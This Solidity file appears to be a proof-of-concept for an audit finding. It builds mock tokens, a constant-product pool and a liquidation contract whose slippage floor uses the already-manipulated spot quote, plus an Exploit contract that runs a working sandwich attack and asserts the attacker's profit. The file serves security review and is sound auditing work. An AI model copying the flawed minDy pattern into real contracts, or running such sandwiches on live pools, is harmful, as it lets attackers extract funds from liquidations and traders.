// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum Aurum LiquidationSwap — H-04 (Pashov, 2025-06-26)
    _swap sets minDy from liquidityPool.get_dy at execution time. A sandwich
    moves the spot first, so the 1% haircut is applied to the bad price and
    the check passes. Stability-pool sale of 1000 index tokens returns 250
    crvUSD instead of the pre-trade 500. The attacker ends +600 index tokens.

    Verbatim: expectedDy = get_dy; minDy haircut; exchange(..., minDy).
*/

contract SwapToken {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ConstantProductPool {
    SwapToken public token0; // crvUSD
    SwapToken public token1; // index
    uint256 public reserve0;
    uint256 public reserve1;

    constructor(SwapToken _token0, SwapToken _token1) {
        token0 = _token0;
        token1 = _token1;
    }

    function sync() external {
        reserve0 = token0.balanceOf(address(this));
        reserve1 = token1.balanceOf(address(this));
    }

    function get_dy(uint256 i, uint256 j, uint256 dx) public view returns (uint256) {
        uint256 x = i == 0 ? reserve0 : reserve1;
        uint256 y = j == 0 ? reserve0 : reserve1;
        uint256 newY = x * y / (x + dx);
        return y - newY;
    }

    function exchange(uint256 i, uint256 j, uint256 dx, uint256 minDy) external returns (uint256 dy) {
        dy = get_dy(i, j, dx);
        require(dy >= minDy, "slippage");
        SwapToken tin = i == 0 ? token0 : token1;
        SwapToken tout = j == 0 ? token0 : token1;
        require(tin.transferFrom(msg.sender, address(this), dx), "pull");
        if (i == 0) reserve0 += dx;
        else reserve1 += dx;
        if (j == 0) reserve0 -= dy;
        else reserve1 -= dy;
        require(tout.transfer(msg.sender, dy), "push");
    }
}

contract LiquidationSwap {
    ConstantProductPool public liquidityPool;
    SwapToken public indexToken;
    bool public enableSlippageProtection = true;
    uint256 public slippageProtectionBps = 100; // 1%
    uint256 public crvOut;

    error InvalidExchange();

    constructor(ConstantProductPool _pool, SwapToken _index) {
        liquidityPool = _pool;
        indexToken = _index;
        _index.approve(address(_pool), type(uint256).max);
    }

    function liquidate() external {
        uint256 amount = indexToken.balanceOf(address(this));
        _swap(msg.sender, amount);
    }

    function _swap(address sender, uint256 amount) internal {
        uint256 expectedDy = liquidityPool.get_dy(1, 0, amount);
        if (expectedDy == 0) revert InvalidExchange();
        uint256 minDy = enableSlippageProtection ? (expectedDy * (10000 - slippageProtectionBps)) / 10000 : 0; // @> VULN: haircut of the spot quote, which the sandwich already moved
        // FIX: apply slippageProtectionBps to a price fixed before this transaction (TWAP / keeper min)
        liquidityPool.exchange(1, 0, amount, minDy);
        crvOut = liquidityPool.token0().balanceOf(address(this));
        if (sender == address(0)) revert InvalidExchange();
    }

    /// @notice Same swap, but minDy is a haircut of the pre-trade fair quote. Not used by run().
    function liquidateWithFloor(uint256 fairDy) external {
        uint256 amount = indexToken.balanceOf(address(this));
        uint256 minDy = fairDy * (10000 - slippageProtectionBps) / 10000;
        liquidityPool.exchange(1, 0, amount, minDy);
    }
}

contract Exploit {
    SwapToken public crv; // CREATE nonce 1
    SwapToken public index; // CREATE nonce 2 — profit token
    ConstantProductPool public pool; // CREATE nonce 3
    LiquidationSwap public liq; // CREATE nonce 4 — vulnerable

    constructor() {
        crv = new SwapToken("crvUSD");
        index = new SwapToken("IDX");
        pool = new ConstantProductPool(crv, index);
        liq = new LiquidationSwap(pool, index);
        // Spot starts at 2000 index / 1500 crvUSD. Fair out for 1000 index is 500 crvUSD.
        index.mint(address(pool), 2000 ether);
        crv.mint(address(pool), 1500 ether);
        pool.sync();
        index.mint(address(this), 1000 ether); // sandwich inventory
        index.mint(address(liq), 1000 ether); // seized index tokens the stability pool must sell
        index.approve(address(pool), type(uint256).max);
        crv.approve(address(pool), type(uint256).max);
    }

    function run() external {
        uint256 fair = pool.get_dy(1, 0, 1000 ether);
        require(fair == 500 ether, "fair quote");
        pool.exchange(1, 0, 1000 ether, 0); // front-run: sell index, crash the crvUSD out
        liq.liquidate();
        require(liq.crvOut() == 250 ether, "stability pool received 250");
        require(fair - liq.crvOut() == 250 ether, "250 crvUSD left on the table");
        uint256 crvBal = crv.balanceOf(address(this));
        pool.exchange(0, 1, crvBal, 0); // back-run
        require(index.balanceOf(address(this)) == 1600 ether, "attacker holds 1600 index");
    }
}
